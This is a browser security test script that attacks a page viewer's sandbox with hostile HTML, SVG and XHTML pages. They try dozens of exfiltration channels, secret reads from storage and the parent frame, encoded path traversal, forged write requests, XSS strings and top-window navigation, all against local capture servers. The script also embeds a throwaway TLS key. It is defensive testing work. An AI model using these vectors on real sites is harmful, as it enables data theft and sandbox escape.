#!/usr/bin/env bash
# Attacks the sandbox in headless Chrome: hostile pages, SVG and XHTML on a served temp docroot, as loaded and with frame.js undone, try every way out (a second local server keeps what arrives), into the control origin and the viewer, to the write routes, to other pages and past an approved host; a page on another local origin tries the docroot's files. On a control server with no policy and no sandbox the same vectors must get through, or the run fails.
# Misses: preconnect, dns-prefetch and a user's own modified click on a link (measured, printed as NOTE); WebRTC, WebTransport, speculation rules; a page opened raw (?static=1), which may navigate away; a link's context menu, a drag; a real second device; browsers outside Chromium.
set -euo pipefail
here="$(cd "$(dirname "$0")/.." && pwd)"
tmp="$(mktemp -d)"; trap 'rm -rf "$tmp"' EXIT
export TMPDIR="$tmp" PYTHONDONTWRITEBYTECODE=1
unset DESIGN_KIT_PORT

rc=0
python3 - "$here" "$tmp" <<'PY' || rc=$?
import hashlib, http.client, http.server, io, json, os, re, socket, ssl, struct, sys, textwrap, threading, time, zlib
from urllib.parse import quote, unquote, urlsplit

here, tmp = sys.argv[1:3]
sys.path.insert(0, os.path.join(here, "__tests__"))
import browser_lib
from browser_lib import Server, bad, close, eq, tabs

m = browser_lib.check.m  # serve.py

# A throwaway pair: this browser takes any certificate, and every name is this machine.
KEY = "MHcCAQEEIOX9S8aD/HcOdJjq89CdmlG9TfZh3yNVdfVPuesnrkXHoAoGCCqGSM49AwEHoUQDQgAE7JdJejuw4NWiAOEsk291/P0EVv8C6KYg8Zh1tHZk6D4AXj5ekHsf87pYRmLOxu7Rc7S5K22JeS9WOWi9cKNj4Q=="
CERT = "MIIBbDCCAROgAwIBAgIUdQ1Q2j1U32d+ZYBdPFRMUNzwEQ4wCgYIKoZIzj0EAwIwDDEKMAgGA1UEAwwBeDAeFw0yNjExMjQxOTQwNTVaFw0zNjExMjExOTQwNTVaMAwxCjAIBgNVBAMMAXgwWTATBgcqhkjOPQIBBggqhkjOPQMBBwNCAATsl0l6O7Dg1aIA4SyTb3X8/QRW/wLopiDxmHW0dmToPgBePl6Qex/zulhGYs7G7tFztLkrbYl5L1Y5aL1wo2Pho1MwUTAdBgNVHQ4EFgQU/gguapmLkYhlk5FLXb/F0D3G0iMwHwYDVR0jBBgwFoAU/gguapmLkYhlk5FLXb/F0D3G0iMwDwYDVR0TAQH/BAUwAwEB/zAKBggqhkjOPQQDAgNHADBEAiAbHoCgbErOWG+L0V0/0wllGL/iFBQvgs67wxtrBNpdvwIgS4+kytQEEOLalxsZL7np0pPxcqCBUvefoJRUfBNBiwQ="
TLS = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
pem = os.path.join(tmp, "tls.pem")
with open(pem, "w") as fh:
    for label, body in (("EC PRIVATE KEY", KEY), ("CERTIFICATE", CERT)):
        fh.write("-----BEGIN %s-----\n%s\n-----END %s-----\n" % (label, textwrap.fill(body, 64), label))
TLS.load_cert_chain(pem)

class Wire:
    """A server on 127.0.0.1 that keeps the head of each request and answers it; opened counts the connections, with and without one."""

    def __init__(self, tls=False):
        self.socket, self.tls = socket.create_server(("127.0.0.1", 0), backlog=128), tls
        self.port, self.opened, self.heads = self.socket.getsockname()[1], 0, []
        threading.Thread(target=self.accept, daemon=True).start()

    def accept(self):
        while True:
            con = self.socket.accept()[0]
            self.opened += 1
            threading.Thread(target=self.take, args=(con,), daemon=True).start()

    def take(self, con):
        con.settimeout(10)
        try:
            with TLS.wrap_socket(con, server_side=True) if self.tls else con as con:
                head = b""
                while b"\r\n\r\n" not in head:
                    head += con.recv(65536) or b"\r\n\r\n"
                if head.strip() and b"/favicon.ico" not in head:
                    self.heads.append(head.decode("latin-1"))
                con.sendall(b"HTTP/1.1 200 OK\r\nAccess-Control-Allow-Origin: *\r\nContent-Type: text/html\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok")
        except OSError:
            pass

    def requests(self):
        return [head.split("\r\n")[0] for head in self.heads]

    def paths(self):
        return {urlsplit(line.split(" ")[1]).path.strip("/") for line in self.requests()}

    def hosts(self):
        return sorted({re.search(r"\r\nHost: (\w*)", head).group(1) for head in self.heads})

SIDES = ("guarded", "control")
second, secure = ({side: Wire(tls) for side in SIDES} for tls in (False, True))
clicked, hinted, looked = Wire(), Wire(), Wire()

# Run by a page, an SVG and an XHTML document; a vector asks for a path of its own name.
ATTACK = r"""
const OUT = 'http://127.0.0.1:@PORT@/', SECURE = '.@SIDE@.example/', HOME = location.origin, END = '<' + '/script>';
const say = (name, got) => top.postMessage({ attack: name, got: String(got) }, '*');
const attempt = async (name, act) => {
  say('try ' + name);
  say(name, await Promise.race([Promise.resolve().then(act), new Promise((done) => setTimeout(done, 1500, 'no answer'))]).catch((e) => 'refused ' + e.name));
};
const all = (group, at = '') => Promise.all(Object.entries(group).map(([name, act]) => attempt(at + name, () => act(OUT + at + name))));
const el = (tag, at = {}, text = '') => {
  const e = document.createElementNS('http://www.w3.org/1999/xhtml', tag);
  for (const name in at) e.setAttribute(name, at[name]);
  e.textContent = text;
  (document.body || document.documentElement).append(e);
  return e;
};
const pause = (ms) => new Promise((done) => setTimeout(done, ms));
const blob = (text, type) => URL.createObjectURL(new Blob([text], { type }));
const xhr = (u, method = 'GET', header, body) => new Promise((done) => { const x = new XMLHttpRequest(); x.open(method, u); if (header) x.setRequestHeader(header, '1'); x.onloadend = () => done(x.status + ' ' + x.responseText); x.send(body); });
const text = (u) => fetch(u).then(async (r) => r.status + ' ' + await r.text());
const work = (source) => new Promise((done) => { new Worker(blob('(async () => { ' + source + ' postMessage("done"); })()', 'text/javascript')).onmessage = (e) => done(e.data); });
const forged = JSON.stringify({ cid: 'f'.repeat(16), board: 'nested.html', picked: 7 });
const nested = (u) => '<script>const u = "' + u + '"; fetch(u + "/fetch").catch(() => 0); new Image().src = u + "/image"; fetch("' + HOME + '/_decision", { method: "POST", headers: { "X-Design-Kit-Decision": "1" }, body: ' + JSON.stringify(forged) + ' }).catch(() => 0);'
  + 'top.postMessage({ dk: 1, t: "pick", picked: 77, knobs: {}, text: {} }, "*"); setTimeout(() => { location = u + "/self"; }, 200);' + END;
const LOADS = {
  fetch: (u) => fetch(u), post: (u) => fetch(u, { method: 'POST', mode: 'no-cors', keepalive: true, body: 'x' }), beacon: (u) => navigator.sendBeacon(u, 'x'), xhr: (u) => xhr(u),
  eventsource: (u) => new Promise((done) => { const s = new EventSource(u); s.onerror = () => { s.close(); done(); }; }), websocket: (u) => new Promise((done) => { new WebSocket(u.replace('http', 'ws')).onclose = done; }), ping: (u) => el('a', { href: '#x', ping: u }).click(),
  image: (u) => { new Image().src = u; }, background: (u) => { el('div', { style: 'height: 1px; background: url(' + u + ')' }); }, poster: (u) => { el('video', { poster: u }); }, video: (u) => { el('video', { src: u, preload: 'auto' }); },
  font: (u) => new FontFace('F', 'url(' + u + ')').load(), stylesheet: (u) => { el('link', { rel: 'stylesheet', href: u }); }, import: (u) => { el('style', {}, '@import url(' + u + ')'); },
  script: (u) => { el('script', { src: u }); }, module: (u) => import(u), prefetch: (u) => { el('link', { rel: 'prefetch', href: u }); },
  frame: (u) => { el('iframe', { src: u }); }, blank: (u) => { el('iframe').contentWindow.location = u; }, object: (u) => { el('object', { data: u }); }, embed: (u) => { el('embed', { src: u }); },
  srcdoc: (u) => { el('iframe', { srcdoc: nested(u) }); }, data: (u) => { el('iframe', { src: 'data:text/html,' + encodeURIComponent(nested(u)) }); }, blob: (u) => { el('iframe', { src: blob(nested(u), 'text/html') }); },
  refresh: (u) => { el('iframe', { srcdoc: '<meta http-equiv="refresh" content="0;url=' + u + '">' }); },
  worker: (u) => work('fetch("' + u + '/fetch").catch(() => 0); try { importScripts("' + u + '/import"); } catch (e) {} new WebSocket("' + u.replace('http', 'ws') + '/socket");'),
  dataworker: (u) => { new Worker('data:text/javascript,fetch("' + u + '")'); }, shared: (u) => { new SharedWorker(blob('fetch("' + u + '")', 'text/javascript')); },
  form: (u) => { el('iframe', { name: 'got' }); el('form', { action: u, target: 'got' }).submit(); }, formpost: (u) => { el('iframe', { name: 'posted' }); el('form', { action: u, target: 'posted', method: 'post' }).submit(); },
  base: async (u) => { const e = el('base', { href: u + '/' }); new Image().src = 'x.png'; await pause(0); e.remove(); },
};
const SELF = {
  href: (u) => { location.href = u; }, replace: (u) => location.replace(u), anchor: (u) => el('a', { href: u }).click(), open: (u) => { open(u, '_self'); }, form: (u) => el('form', { action: u }).submit(),
  meta: (u) => { el('meta', { 'http-equiv': 'refresh', content: '0;url=' + u }); },
};
const TOP = {
  href: (u) => { top.location.href = u; }, replace: (u) => top.location.replace(u), anchor: (u) => el('a', { href: u, target: '_top' }).click(), open: (u) => { open(u, '_top'); }, form: (u) => el('form', { action: u, target: '_top' }).submit(),
  parent: (u) => { parent.location = u; }, nested: (u) => { el('iframe', { src: blob('<script>top.location = "' + u + '"' + END, 'text/html') }); },
};
// each done in a plain click of the user
const CLICK = {
  open: (u) => { open(u); }, blank: (u) => el('a', { href: u, target: '_blank' }).click(), form: (u) => el('form', { action: u, target: '_blank' }).submit(), top: (u) => el('a', { href: u, target: '_top' }).click(),
  modified: (u) => { el('a', { href: u }).dispatchEvent(new MouseEvent('click', { ctrlKey: true, bubbles: true, cancelable: true })); },
};
// what it reads of the control origin and the viewer: a secret, once it got there
const STORES = {
  storage: () => localStorage.getItem('secret'), realm: () => el('iframe').contentWindow.localStorage.getItem('secret'), cookie: () => document.cookie, caches: async () => (await caches.match('/secret')).text(),
  database: () => new Promise((done, fail) => { const r = indexedDB.open('secret'); r.onerror = fail; r.onsuccess = () => { r.result.transaction('s').objectStore('s').get(1).onsuccess = (e) => done(e.target.result); }; }),
  document: () => parent.document.documentElement.dataset.secret, element: () => frameElement.ownerDocument.documentElement.dataset.secret, global: () => top.secret, viewerstorage: () => parent.localStorage.getItem('secret'),
  nested: () => new Promise((done) => { addEventListener('message', (e) => e.data.nested && done(e.data.nested)); el('iframe', { src: blob('<script>const got = []; for (const read of [() => localStorage.getItem("secret"), () => document.cookie, () => top.secret]) try { got.push(read()); } catch (e) { got.push(e.name); } parent.postMessage({ nested: got.join() }, "*");' + END, 'text/html') }); }),
};
const PLANTS = {
  cookie: () => { document.cookie = 'planted=1; path=/'; }, storage: () => { localStorage.setItem('planted', 1); }, database: () => new Promise((done, fail) => { const r = indexedDB.open('planted'); r.onsuccess = done; r.onerror = fail; }),
  document: () => { parent.document.documentElement.dataset.planted = 1; }, serviceworker: () => navigator.serviceWorker.register(HOME + '/boards/worker.js').then((r) => r.unregister()), sharedworker: () => { new SharedWorker(HOME + '/boards/worker.js'); },
};
const READS = {};
for (const [name, at] of Object.entries({ page: '/artifacts/victim.html', raw: '/artifacts/victim.html?static=1', png: '/boards/victim.png', index: '/_index.json', notes: '/_notes?page=/artifacts/victim.html', checks: '/_checks?page=/artifacts/victim.html', address: '/_page?page=artifacts/victim.html' })) {
  READS[name + ' fetched'] = () => text(HOME + at);
  READS[name + ' by xhr'] = () => xhr(HOME + at);
  READS[name + (name === 'png' ? ' drawn' : ' framed')] = () => new Promise((done, fail) => {
    const e = el(name === 'png' ? 'img' : 'iframe', { src: HOME + at });
    e.onerror = fail;
    e.onload = () => { try { done(name === 'png' ? e.naturalWidth === 7 && 'SECRET' : e.contentDocument.documentElement.textContent); } catch (error) { fail(error); } };
  });
}
const TOKENS = {}, [, , seg] = location.pathname.split('/'), own = location.pathname.replace(/[^/]*$/, '');
const b64 = (s) => btoa(s).replace(/=+$/, '').replace(/\+/g, '-').replace(/\//g, '_');
for (const [name, at] of Object.entries({
  'another page under this token': '/_c/' + seg + '/artifacts/victim.html', 'this token naming another page': '/_c/' + String(seg).split('.')[0] + '.' + b64('artifacts/victim.html') + '/artifacts/victim.html', 'this token as a static one': '/_c/' + seg + '.s/motion/hole/index.html',
  'another page of its folder': own + 'other.html', 'the same spelt otherwise': own + 'other.htm%6c', 'a link to another page': own + 'link.txt', 'a dot file': own + '.dot.txt', 'a page above': own + '..%2f..%2fartifacts%2fvictim.html', 'a picture above': own + '..%2f..%2fboards/victim.png',
  'the notes above': own + '%2e%2e%2f%2e%2e%2fnotes.jsonl', 'the checks above': own + '..%2f..%2f.checks%2fresults.json', 'a route above': own + '..%2f..%2f..%2f..%2f_index.json', 'its own file': own + 'own.txt',
})) TOKENS[name] = () => text(HOME + at);
const POSTS = {};
for (const [route, header, body] of [['/_decision', 'X-Design-Kit-Decision', { cid: 'a'.repeat(16), board: 'forged.html', picked: 1, knobs: {}, text: {}, prompt: 'forged' }], ['/_note', 'X-Design-Kit-Note', { cid: 'b'.repeat(16), page: '/boards/attack.html', text: 'forged' }], ['/_allow', 'X-Design-Kit-Allow', { page: 'boards/attack.html', host: 'forged.example', allow: true }]]) {
  const json = JSON.stringify(body), u = HOME + route;
  Object.assign(POSTS, {
    [route + ' fetch']: () => fetch(u, { method: 'POST', headers: { [header]: '1' }, body: json }).then((r) => r.status), [route + ' plain']: () => fetch(u, { method: 'POST', mode: 'no-cors', body: json }).then((r) => r.type),
    [route + ' worker']: () => work('await fetch("' + u + '", { method: "POST", headers: { "' + header + '": "1" }, body: ' + JSON.stringify(json) + ' }).catch(() => 0);'), [route + ' xhr']: () => xhr(u, 'POST', header, json), [route + ' beacon']: () => navigator.sendBeacon(u, json), [route + ' above']: () => fetch(HOME + own + '..%2f..%2f..%2f..%2f' + route.slice(1), { method: 'POST', mode: 'no-cors', body: json }).then((r) => r.type),
    [route + ' form']: () => { el('iframe', { name: 'to' + route }); const f = el('form', { action: u, method: 'post', enctype: 'text/plain', target: 'to' + route }); f.append(Object.assign(document.createElement('input'), { name: json })); f.submit(); },
  });
}
// every type of the bridge, both ways, and some of none
const X = '<img src=x onerror=top.secret>', said = { viewport: { w: 1, h: 1 }, theme: X, console: [X] };
const FORGED = [
  { t: 'ready', hash: '#' + X }, { t: 'ready', hash: '#/9' }, { t: 'pong', n: -1 }, { t: 'pong', n: 1e9 }, { t: 'pong', n: 1, moved: true, left: 1e308, top: -1e308 }, { t: 'pong', n: 1, moved: X, left: X, top: X }, { t: 'scroll', left: 1e308, top: 0 }, { t: 'hash', hash: '//out.example' }, { t: 'hash', hash: '?static=1' }, { t: 'hash', hash: '#/9' },
  { t: 'store', items: [['secret', 'forged'], ['dk-pick:x', X], ['__proto__', X], ['..:/:x', X]] }, { t: 'store', items: [['big', 'x'.repeat(300000)]] }, { t: 'store', clear: true },
  { t: 'pick', picked: 1, knobs: { all: { space: 12, evil: X } }, text: { 1: { 'h1:0': { was: X, now: X } } }, board: '../forged.html', prompt: X, cid: 'f'.repeat(16) }, { t: 'pick', picked: X, knobs: X, text: X },
  { t: 'blocked', host: X, kind: 'script' }, { t: 'blocked', host: 'forged.example', kind: 'script' }, { t: 'blocked', host: 'forged.example', kind: 'connect' }, { t: 'allow', page: 'boards/attack.html', host: 'forged.example', allow: true },
  { t: 'link', href: 'javascript:top.secret' }, { t: 'link', href: 'data:text/html,' + X }, { t: 'link', href: HOME + '/artifacts/victim.html' }, { t: 'link', href: HOME + '/_allow' }, { t: 'link', href: OUT + 'link' }, { t: 'open', href: OUT + 'open' },
  { t: 'key', name: 'notes' }, { t: 'anchor', anchor: { selector: X, tag: X, text: X, rect: { x: 0, y: 0, w: 1, h: 1 } }, context: said }, { t: 'context', context: said }, { t: 'note', text: 'forged' }, { t: 'key', name: 'escape' }, { t: 'key', name: 'constructor' },
  { t: 'ping', n: 1 }, { t: 'notes', on: true }, { t: 'print' }, { t: 'ask' }, { t: 'storefull', k: 'x' }, { t: '__proto__' }, { t: ['pick'] },
].map((one) => ({ dk: 1, ...one }));
async function forge() {
  for (const one of FORGED) { parent.postMessage(one, '*'); await pause(25); }
  const page = '<script>for (const one of ' + JSON.stringify(FORGED).replace(/</g, '\\x3c') + ') if (one.t !== "link") top.postMessage({ ...one, picked: 77, hash: "#/77", items: [["nested", "77"]], host: "nested.example" }, "*");' + END;
  el('iframe', { src: 'data:text/html,' + encodeURIComponent(page) });
  el('iframe', { src: blob(page, 'text/html') });
  await pause(300);
}
// an approval covers the first five
const HOSTED = {
  script: LOADS.script, style: LOADS.stylesheet, image: LOADS.image, font: LOADS.font, media: LOADS.video, fetch: LOADS.fetch, post: LOADS.post, beacon: LOADS.beacon, xhr: LOADS.xhr, eventsource: LOADS.eventsource, websocket: LOADS.websocket, ping: LOADS.ping,
  form: LOADS.form, formpost: LOADS.formpost, frame: LOADS.frame, object: LOADS.object, worker: (u) => work('await fetch("' + u + '").catch(() => 0);'),
};
// what frame.js listens to and stands in for; the page's own fetch stays wrapped, a worker's and a nested frame's never was
function undo() {
  document.open(); document.write('<!doctype html><body>'); document.close();
  delete window.localStorage; delete window.sessionStorage;
}
const GROUPS = {
  loads: () => all(LOADS), self: (one) => attempt('self/' + one, () => SELF[one](OUT + 'self/' + one)), top: (one) => (one ? attempt('top/' + one, () => TOP[one](OUT + 'top/' + one)) : all(TOP, 'top/')),
  stores: () => all(STORES, 'store: '), plants: () => all(PLANTS, 'plant: '), reads: () => all(READS, 'read: '), tokens: () => all(TOKENS, 'token: '), posts: () => all(POSTS, 'post: '), forge,
  click: () => { for (const name in CLICK) el('button', { id: name }, name).onclick = () => attempt('click/' + name, () => CLICK[name](OUT + 'click/' + name)); el('a', { id: 'link', href: 'http://127.0.0.1:@CLICKED@/' }, 'link'); },
  hosted: async () => { await Promise.all(Object.entries(HOSTED).map(([name, act]) => attempt('hosted: ' + name, () => act('https://' + name + SECURE)))); await pause(800); location = 'https://self' + SECURE; },
  doc: (one) => { say('try ' + one); location = 'evil.' + one; },
  hints: () => { for (const at of [{ rel: 'preconnect' }, { rel: 'preconnect', crossorigin: '' }]) el('link', { ...at, href: 'http://127.0.0.1:@HINTED@/' }); el('link', { rel: 'dns-prefetch', href: 'http://looked.example:@LOOKED@/' }); },
};
// an SVG or an XHTML document's: frame.js is not in it
async function inside(at, leaves) {
  document.documentElement.setAttribute('ran', '1');
  say('ran ' + at, self.origin);
  await all({ fetch: LOADS.fetch, image: LOADS.image, websocket: LOADS.websocket, beacon: LOADS.beacon, script: LOADS.script }, at + '/');
  if (leaves) location = OUT + at + '/self';
}
async function go(asked, undone) {
  if (undone) undo();
  say('origin', self.origin);
  for (const group of asked.split(',')) await GROUPS[group.split('-')[0]](group.split('-')[1]);
  say('end');
}
"""
PAGE = "<!doctype html><html><head><title>%s</title></head><body><script>%s\naddEventListener('load', () => { const q = new URLSearchParams(location.search); go(q.get('v') || 'loads,stores,plants,reads,posts,top,self-href', q.get('undone')); });</script></body></html>"
SVG = '<svg xmlns="http://www.w3.org/2000/svg"><script><![CDATA[%s\ninside("%s", %s);]]></script></svg>'
XHTML = '<html xmlns="http://www.w3.org/1999/xhtml"><head><title>x</title></head><body><script><![CDATA[%s\ninside("%s", %s);]]></script></body></html>'
OTHER = """<!doctype html><title>another local origin</title><script>
const load = (tag, src) => new Promise((done) => { const e = document.createElement(tag); e.onload = () => done('loaded'); e.onerror = () => done('error'); e.src = src; document.head.append(e); });
const take = async (base) => [await load('script', base + '/decks/own.js'), window.included || 0, await load('img', base + '/boards/victim.png')];
</script>"""

def png(width):
    chunk = lambda kind, data: struct.pack(">I", len(data)) + kind + data + struct.pack(">I", zlib.crc32(kind + data))
    return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", width, 1, 8, 0, 0, 0, 0)) + chunk(b"tEXt", b"Title\0SECRET") + chunk(b"IDAT", zlib.compress(b"\0" * (width + 1))) + chunk(b"IEND", b"")

ROOTS = {side: os.path.join(tmp, side) for side in SIDES}
HOSTILE, HOLE = "boards/attack.html", "motion/hole/index.html"

def docroot(side):
    source = ATTACK
    for word, value in (("PORT", second[side].port), ("SIDE", side), ("CLICKED", clicked.port), ("HINTED", hinted.port), ("LOOKED", looked.port)):
        source = source.replace("@%s@" % word, str(value))
    victim = "<!doctype html><html><head><title>SECRET title</title></head><body><p>SECRET text</p></body></html>"
    files = {
        HOSTILE: PAGE % ("attack", source), HOLE: PAGE % ("hole", source), "artifacts/victim.html": victim, "motion/hole/other.html": victim, "motion/hole/own.txt": "OWN", "motion/hole/.dot.txt": "SECRET",
        "boards/victim.png": png(7), "boards/worker.js": "", "decks/own.js": "window.included = 1", "other.html": OTHER,
        "notes.jsonl": json.dumps({"id": "n1", "page": "artifacts/victim.html", "text": "SECRET note", "status": "open"}) + "\n",
        ".checks/results.json": json.dumps({"artifacts/victim.html": {"ts": "SECRET check", "findings": 1, "widths": [375], "mtime_ns": 1}}),
    }
    for kind, form in (("svg", SVG), ("xhtml", XHTML)):
        files["motion/hole/evil." + kind] = form % (source, kind, "true")
        files["shots/evil." + kind] = form % (source, "direct-" + kind, "false")
    for name, body in files.items():
        path = os.path.join(ROOTS[side], name)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "wb") as fh:
            fh.write(body if isinstance(body, bytes) else body.encode())
    os.symlink("../../artifacts/victim.html", os.path.join(ROOTS[side], "motion/hole/link.txt"))

def tree(side):
    """What is in a docroot, dot files included."""
    found = {}
    for folder, _, names in os.walk(ROOTS[side]):
        for name in names:
            with open(os.path.join(folder, name), "rb") as fh:
                found[os.path.relpath(os.path.join(folder, name), ROOTS[side])] = hashlib.sha256(fh.read()).hexdigest()
    return found

def rows(name, field):
    """That field of each row the control wrote."""
    try:
        with open(os.path.join(ROOTS["control"], name), encoding="utf-8") as fh:
            return [json.loads(line).get(field) for line in fh]
    except FileNotFoundError:
        return []

LOG = os.path.join(tmp, "asked")
# serve.py writes down each request it gets
KEPT = """import json
class Kept(m.Handler):
    def parse_request(self):
        parsed = super().parse_request()
        if parsed:
            with open(%r, "a") as fh:
                fh.write(json.dumps([self.command, self.path]) + chr(10))
        return parsed
m.Handler = Kept""" % LOG

def posted():
    """Where the guarded server was posted to, but for what a page posts under its own address, which no route takes."""
    with open(LOG) as fh:
        return [path for method, path in map(json.loads, fh) if method == "POST" and not path.startswith("/_c/")]

class Control(m.Handler):
    """serve.py's routes over plain files: no header of isolate.py's, no refusal of a worker, no viewer; /_frame?<address> frames a page with no sandbox."""
    root, state = ROOTS["control"], {"version": 0, "last": time.monotonic(), "streams": 0}
    posts = []

    def _refused(self):
        return False

    def end_headers(self):
        http.server.SimpleHTTPRequestHandler.end_headers(self)

    def do_POST(self):
        self.posts.append(self.path)
        super().do_POST()

    def send_head(self):
        path, query = m.split_target(self.path)
        if path != "/_frame":
            return http.server.SimpleHTTPRequestHandler.send_head(self)
        body = b'<!doctype html><title>control</title><iframe style="width: 1000px; height: 700px" src="%s"></iframe>' % unquote(query).encode()
        self._head(len(body), "text/html")
        return io.BytesIO(body)

def unguarded():
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Control)
    srv.daemon_threads = True
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return "http://127.0.0.1:%d" % srv.server_port

# In place of NO_NETWORK, whose dead proxy stops what the policy must: a name is this machine or nothing.
browser_lib.check.NO_NETWORK[:] = ["--no-proxy-server", "--ignore-certificate-errors", "--webrtc-ip-handling-policy=disable_non_proxied_udp", "--force-webrtc-ip-handling-policy=disable_non_proxied_udp", "--host-resolver-rules=" + ", ".join(
    ["MAP *.%s.example 127.0.0.1:%d" % (side, secure[side].port) for side in SIDES] + ["MAP looked.example 127.0.0.1", "MAP * ~NOTFOUND", "EXCLUDE 127.0.0.1"])]
# in the viewer, and in the control's own page: a secret, and what the pages inside report
RECORD = "window.secret = 'SECRET global'; window.heard = []; addEventListener('message', (e) => { if (e.data && e.data.attack) heard.push([e.data.attack, e.data.got]); }); document.addEventListener('DOMContentLoaded', () => { document.documentElement.dataset.secret = 'SECRET document'; });"
SECRETS = """(async () => {
  localStorage.setItem('secret', 'SECRET storage'); document.cookie = 'secret=SECRET; path=/';
  await (await caches.open('secret')).put('/secret', new Response('SECRET cache'));
  await new Promise((done) => { const r = indexedDB.open('secret'); r.onupgradeneeded = () => r.result.createObjectStore('s').put('SECRET row', 1); r.onsuccess = () => { r.result.close(); done(); }; });
})()"""

def visit(b, url, h=800):
    return browser_lib.visit(b, url, h=h, source=RECORD)

def framed(side, at):
    return URL[side] + (at if side == "guarded" else "/_frame?" + quote(at))

heard = {side: [] for side in SIDES}  # [what, with what result, on which page, with frame.js undone]

def hear(side, tab, page, undone=False):
    heard[side] += [said + [page, undone] for said in tab.evaluate("window.heard || []")]

def attack(b, side, page, groups, undone=False, done="heard.some(([what]) => what === 'end')"):
    """The tab where the page ran these groups."""
    tab = visit(b, framed(side, "/%s?v=%s%s" % (page, groups, "&undone=1" if undone else "")))
    tab.wait(done, 15)
    hear(side, tab, page, undone)
    return tab

def tried(side, kind="", undone=None, page=None):
    return {what[4:] for what, _, where, how in heard[side] if what.startswith("try " + kind) and undone in (None, how) and page in (None, where)}

def took(side, kind):
    """What came back with the secret."""
    return {what for what, got, _, _ in heard[side] if what.startswith(kind) and "SECRET" in got}

def got(side, what, page=HOLE):
    return {result for name, result, where, _ in heard[side] if name == what and where == page}

def until(fn, seconds=6):
    """fn()'s value once it is truthy, else its last when the seconds ran out."""
    end = time.monotonic() + seconds
    while not fn() and time.monotonic() < end:
        time.sleep(0.05)
    return fn()

def opened(b, do, seconds=0.5):
    """How many tabs do() opened, at the first or when the seconds ran out; they are closed again."""
    before = tabs(b)
    do()
    new = until(lambda: tabs(b) - before, seconds)
    close(b, new)
    return len(new)

def arrives(*paths):
    """Waits until the control's second server was asked for these."""
    until(lambda: not set(paths) - second["control"].paths())

def ran(b, tab):
    node = b.chrome.call("DOM.getDocument", {"depth": 0}, tab.sid)["root"]["nodeId"]
    return ' ran="1"' in b.chrome.call("DOM.getOuterHTML", {"nodeId": node}, tab.sid)["outerHTML"].split("<script")[0]

def approve(host):
    con = http.client.HTTPConnection("127.0.0.1", server.port, timeout=5)
    con.request("POST", "/_allow", json.dumps({"page": HOSTILE, "host": host, "allow": True}), {"X-Design-Kit-Allow": "1"})
    return con.getresponse().status

NAMES = {
    "": "fetch post beacon xhr eventsource websocket ping image background poster video font stylesheet import script module prefetch frame blank object embed srcdoc data blob refresh worker dataworker shared form formpost base".split(),
    "self/": "href replace anchor open form meta".split(), "top/": "href replace anchor open form parent nested".split(), "click/": "open blank form top modified".split(),
}
EVERY = {kind + name for kind, names in NAMES.items() for name in names}
# the paths LOADS asks for: a nested document and a worker ask for several
LOADED = set(NAMES[""]) - {"base", "srcdoc", "data", "blob", "worker"} | {"base/x.png", "worker/fetch", "worker/import", "worker/socket"} | {"%s/%s" % (of, name) for of in ("srcdoc", "data", "blob") for name in ("fetch", "image", "self")}
INSIDE = {of: {"%s/%s" % (of, name) for name in ("fetch", "image", "websocket", "beacon", "script")} for of in ("svg", "xhtml", "direct-svg", "direct-xhtml")}
PATHS = LOADED.union({kind + name for kind in ("top/", "click/") for name in NAMES[kind]}, {"svg/self", "xhtml/self"}, *INSIDE.values())
HOSTED = "script style image font media fetch post beacon xhr eventsource websocket ping form formpost frame object worker self".split()
WAYS = (("store: ", 10, "what the control origin or the viewer holds"), ("read: ", 21, "another page, a picture or a route"))
STOPPED = "!!document.querySelector('.stopped')"
STRIPS = "[...document.querySelectorAll('#strips > *')].map((s) => s.textContent).join(' ')"
STATE = """(async () => [location.pathname, document.cookie.includes('planted'), Object.keys(localStorage).filter((k) => !k.startsWith('dk-store:')).sort(), (await indexedDB.databases()).map((d) => d.name).sort(), document.documentElement.dataset.planted || null,
  document.querySelectorAll('img, body script:not([src="/_viewer.js"]), #strips a, #drawer a').length, document.querySelectorAll('iframe').length])()"""

def untouched(page):
    return ["/" + page, False, ["secret"], ["secret"], None, 0, 1]

def guarded(b):
    visit(b, URL["guarded"] + "/artifacts/victim.html").evaluate(SECRETS)
    before = tree("guarded")
    tab = visit(b, URL["guarded"] + "/_gallery", 1600)
    tab.wait("heard.filter(([what]) => what === 'end').length > 1", 15)
    hear("guarded", tab, "gallery", None)
    eq("a page runs in its gallery thumbnail too", lambda: sorted({"fetch", "top/href", "self/href"} - tried("guarded", page="gallery")), [])
    for undone in (False, True):
        blind = ", frame.js undone" if undone else ""
        for page in (HOSTILE, HOLE):
            tab = attack(b, "guarded", page, "loads,stores,plants,reads,tokens,posts,top", undone)
            eq("%s leaves the viewer and its origin as they were%s" % (page, blind), lambda: tab.evaluate(STATE), untouched(page))
        tab = attack(b, "guarded", HOSTILE, "forge", undone)
        eq("a pick the page forges shows a strip; one of a frame inside it, and every other message, does no more than a page may%s" % blind,
           lambda: [tab.wait(STRIPS + ".includes('Artboard 1 picked')", 4), time.sleep(1.8), tab.evaluate("[%s.match(/Artboard 77|nested|javascript|victim/), location.search, location.hash, Object.keys(localStorage).some((k) => k.includes('nested'))]" % STRIPS), tab.evaluate(STATE)][2:],
           [[None, "?v=forge" + ("&undone=1" if undone else ""), "#/9", False], untouched(HOSTILE)])
        for name in NAMES["self/"]:
            attack(b, "guarded", HOSTILE, "self-" + name, undone).wait(STOPPED, 0.5)
        tab = attack(b, "guarded", HOSTILE, "click", undone)
        def clicks():
            f = tab.frame()
            for name in NAMES["click/"]:
                tab.click(*f.at("#" + name))
                time.sleep(0.1)
        eq("a plain click opens no tab and leaves the viewer%s" % blind, lambda: [opened(b, clicks), tab.evaluate("location.pathname")], [0, "/" + HOSTILE])
        hear("guarded", tab, HOSTILE, undone)
        eq("every vector was tried%s" % blind, lambda: sorted(EVERY - tried("guarded", undone=undone, page=HOSTILE)), [])
    for kind in ("svg", "xhtml"):
        tab = attack(b, "guarded", HOLE, "doc-" + kind, done=STOPPED + " && heard.some(([what]) => what === 'ran %s')" % kind)
        eq("an own-folder %s runs in the frame, in an opaque origin, and is stopped when it leaves" % kind, lambda: [got("guarded", "ran " + kind), tab.evaluate(STOPPED)], [{"null"}, True])
    for kind, ways, what in WAYS + (("token: ", 13, "what is under its own token and folder"),):
